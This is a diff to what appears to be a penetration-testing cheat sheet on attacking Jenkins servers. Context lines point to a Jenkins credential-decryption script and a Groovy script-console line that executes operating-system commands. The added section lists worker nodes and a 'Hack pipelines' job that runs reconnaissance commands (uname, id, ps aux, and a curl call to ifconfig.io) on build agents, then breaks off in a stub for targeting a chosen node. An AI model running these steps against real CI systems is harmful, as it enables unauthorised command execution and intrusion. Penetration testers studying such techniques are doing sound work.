@@ -7,3 +7,29 @@ https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py
 def process = "[os-command]".execute()
 println "${process.text}"
 
+## View Workets
+http://IP:port/jenkins/computer/
+
+## Hack pipelines
+pipeline{
+	agent any
+	stages {
+	   stage('Run') {
+		  steps {
+			 sh 'uname -a'
+			 sh 'id'
+			 sh 'curl ifconfig.io'
+			 sh 'ps aux'
+		  }
+		}
+	}
+}
+
+## Select Node
+pipeline{
+	agent {
+			label 'Name'
+	    }
+	stages {
+	   stage(....
+
